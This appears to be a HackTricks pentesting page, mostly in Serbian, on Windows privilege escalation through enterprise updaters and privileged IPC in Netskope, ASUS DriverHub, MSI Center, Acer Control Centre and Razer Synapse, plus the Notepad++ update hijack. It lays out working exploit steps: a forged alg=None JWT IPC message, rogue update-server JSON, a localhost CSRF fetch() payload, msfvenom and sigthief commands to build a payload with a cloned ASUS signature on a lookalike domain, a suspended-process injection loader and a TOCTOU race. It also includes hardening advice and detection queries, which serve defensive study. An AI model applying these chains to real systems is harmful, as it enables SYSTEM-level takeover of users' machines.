# Zloupotreba Enterprise Auto-Updaters i Privileged IPC (npr. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica generalizuje klasu Windows local privilege escalation lanaca pronađenih u enterprise endpoint agentima i updaterima koji izlažu IPC površinu sa niskim otporom i privileged update flow. Reprezentativan primer je Netskope Client za Windows < R129 (CVE-2025-0309), gde low-privileged korisnik može da iznudi enrollment na server pod kontrolom napadača, a zatim da isporuči zlonamerni MSI koji SYSTEM servis instalira.

Ključne ideje koje možeš ponovo da iskoristiš protiv sličnih proizvoda:
- Zloupotrebi privileged service localhost IPC da nateraš re-enrollment ili reconfiguration ka attacker serveru.
- Implementiraj vendorove update endpoints, isporuči rogue Trusted Root CA, i usmeri updater ka zlonamernom, “signed” paketu.
- Zaobiđi slabe signer provere (CN allow-lists), optional digest flags, i labave MSI properties.
- Ako je IPC “encrypted”, izvedi key/IV iz world-readable machine identifikatora sačuvanih u registru.
- Ako servis ograničava pozivaoce po image path/process name, injektuj se u allow-listed proces ili ga pokreni suspended i bootstrapuj svoj DLL pomoću minimalnog thread-context patch-a.

---
## 1) Forsiranje enrollment-a ka attacker serveru preko localhost IPC

Mnogi agenti isporučuju user-mode UI proces koji komunicira sa SYSTEM servisom preko localhost TCP koristeći JSON.

Uočeno u Netskope:
- UI: stAgentUI (low integrity) ↔ Servis: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Eksploit tok:
1) Napravi JWT enrollment token čiji claims kontrolišu backend host (npr. AddonUrl). Koristi alg=None tako da nije potreban potpis.
2) Pošalji IPC poruku koja poziva provisioning command sa tvojim JWT i tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis počinje da šalje zahteve ka tvom rogue serveru za enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Napomene:
- Ako je caller verification zasnovana na path/name, pokreni zahtev iz allow-listed vendor binary-ja (vidi §4).

---
## 2) Hijacking update channel to run code as SYSTEM

Kada klijent počne da komunicira sa tvojim serverom, implementiraj očekivane endpoints i usmeri ga na attacker MSI. Tipičan redosled:

1) /v2/config/org/clientconfig → Vrati JSON config sa veoma kratkim updater intervalom, npr.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Vrati PEM CA sertifikat. Servis ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Dostavi metapodatke koji ukazuju na malicious MSI i lažnu verziju.

Zaobilaženje uobičajenih provera viđenih u praksi:
- Signer CN allow-list: servis možda proverava samo da Subject CN bude “netSkope Inc” ili “Netskope, Inc.”. Tvoj rogue CA može izdati leaf sa tim CN i potpisati MSI.
- CERT_DIGEST property: uključi benign MSI property pod nazivom CERT_DIGEST. Nema enforcement-a pri instalaciji.
- Optional digest enforcement: config flag (npr. check_msi_digest=false) isključuje dodatnu kriptografsku validaciju.

Rezultat: SYSTEM servis instalira tvoj MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
izvršavajući arbitrary code kao NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Od R127, Netskope je umotao IPC JSON u encryptData polje koje izgleda kao Base64. Reverziranjem je pokazano da AES koristi key/IV izvedene iz registry vrednosti koje može da pročita bilo koji user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers mogu da reprodukuju enkripciju i šalju validne encrypted komande iz standardnog user-a. Opšti savet: ako se agent iznenada “encrypts” svoj IPC, traži device IDs, product GUID-ove, install IDs pod HKLM kao materijal.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Neki servisi pokušavaju da autentifikuju peer tako što razreše PID TCP konekcije i uporede image path/name sa allow-listed vendor binary-ima koji se nalaze pod Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična bypass-a:
- DLL injection u allow-listed proces (npr. nsdiag.exe) i proxy IPC iznutra.
- Pokreni allow-listed binary suspended i bootstrapuj svoj proxy DLL bez CreateRemoteThread (vidi §5) da bi zadovoljio driver-enforced tamper pravila.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Produkti često dolaze sa minifilter/OB callbacks driverom (npr. Stadrv) da bi skinuli dangerous rights sa handle-ova ka protected procesima:
- Process: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ograničava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan user-mode loader koji poštuje ova ograničenja:
1) CreateProcess vendor binary-ja sa CREATE_SUSPENDED.
2) Uzmi handle-ove koje i dalje smeš da koristiš: PROCESS_VM_WRITE | PROCESS_VM_OPERATION na procesu, i thread handle sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako patchuješ code na poznatom RIP-u).
3) Prepiši ntdll!NtContinue (ili drugi early, garantovano mapped thunk) malim stubom koji poziva LoadLibraryW na putanju tvoje DLL, a zatim se vraća nazad.
4) ResumeThread da bi pokrenuo tvoj stub unutar procesa i učitao tvoj DLL.

Pošto nikad nisi koristio PROCESS_CREATE_THREAD ili PROCESS_SUSPEND_RESUME nad već protected procesom (ti si ga kreirao), driver-ova politika je zadovoljena.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizuje rogue CA, potpisivanje malicious MSI-ja i servisira potrebne endpoint-e: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope je custom IPC client koji pravi arbitrary (opciono AES-encrypted) IPC poruke i uključuje suspended-process injection da bi potekle iz allow-listed binary-ja.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Kada se suočiš sa novim endpoint agentom ili motherboard “helper” suite-om, brz workflow je obično dovoljan da utvrdiš da li gledaš u obećavajući privesc target:

1) Enumeriši loopback listenere i mapiraj ih nazad na vendor procese:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Nabroji candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Izdvoji routing podatke iz registry-ja koje koriste plugin-based IPC servers:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Prvo izvuci nazive endpointova, JSON ključeve i command ID-jeve iz user-mode klijenta. Packed Electron/.NET frontendi često otkrivaju celu šemu:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Traži stvarni trust predicate, a ne samo code path koji na kraju pokreće process:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Obrasci koje vredi prioritetno proveriti:
- `CryptQueryObject`/parsiranje sertifikata bez `WinVerifyTrust` obično znači da je „sertifikat postoji” tretirano kao „sertifikat je trusted”, što omogućava certificate cloning ili druge fake-signer trikove.
- Provere podniza/sufiksa nad `Origin`, `Referer`, download URL-ovima, imenima procesa ili signer CN-ovima nisu autentikacija. `contains(".vendor.com")` je obično exploitable uz attacker-controlled lookalike domene.
- Ako low-privileged GUI odlučuje „datoteka je trusted”, a SYSTEM broker samo koristi taj rezultat, patchovanje ili reimplementacija client-side DLL/JS često potpuno zaobilazi granicu (Razer-style split validation).
- Ako broker kopira payload u `%TEMP%`/`C:\Windows\Temp` i zatim ga validira ili schedule-uje iz te putanje, odmah testiraj TOCTOU replacement windows i sibling plugin module koji izlažu alternativne `ExecuteTask()` wrapper-e sa slabijim proverama.

Za ciljeve sa mnogo named-pipe-ova, PipeViewer je brz način da uočiš slabe DACL-ove i pipe-ove kojima se može remotely pristupiti pre nego što kreneš duboko da reverse-uješ protokol.

Ako target autentifikuje pozivaoce samo po PID-u, image path-u ili process name-u, tretiraj to kao speed bump, a ne kao granicu: injecting u legitimni client, ili uspostavljanje connection-a iz allow-listed procesa, često je dovoljno da zadovolji serverove provere. Za named pipes konkretno, [ova stranica o client impersonation i pipe abuse](named-pipe-client-impersonation.md) detaljnije pokriva taj primitive.

---
## 1) Browser-to-localhost CSRF protiv privileged HTTP API-ja (ASUS DriverHub)

DriverHub isporučuje user-mode HTTP service (ADU.exe) na 127.0.0.1:53000 koji očekuje browser pozive koji dolaze sa https://driverhub.asus.com. Origin filter jednostavno radi `string_contains(".asus.com")` nad Origin header-om i nad download URL-ovima izloženim preko `/asus/v1.0/*`. Svaki attacker-controlled host kao što je `https://driverhub.asus.com.attacker.tld` zato prolazi proveru i može da šalje state-changing requests iz JavaScript-a. Vidi [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) za dodatne bypass obrasce.

Praktičan flow:
1) Registruj domen koji sadrži `.asus.com` i hostuj malicious webpage tamo.
2) Koristi `fetch` ili XHR da pozoveš privileged endpoint (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošalji JSON body koji handler očekuje – packed frontend JS prikazuje schema-u ispod.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Čak i PowerShell CLI prikazan ispod uspeva kada je Origin header lažiran na trusted vrednost:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Between June 2025 and December 2025, attackers who compromised the hosting infrastructure behind the Notepad++ update flow selectively served malicious manifests to chosen victims. Older WinGUp-based updaters did not fully verify update authenticity, so a hostile XML response could redirect clients to attacker-controlled URLs. Because the client accepted HTTPS content without enforcing both a trusted certificate chain and a valid PE signature on the downloaded installer, victims fetched and executed a trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.
- Notepad++ responded by strengthening WinGUp in v8.8.9 and later: the returned XML is now signed (XMLDSig), and newer builds enforce certificate + signature verification of the downloaded installer instead of trusting the transport alone.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće instalater koji nije Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ovi obrasci se generalizuju na svaki updater koji prihvata unsigned manifests ili ne uspeva da pin-uje installer signers—network hijack + malicious installer + BYO-signed sideloading rezultuje remote code execution pod maskom „trusted“ update-a.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
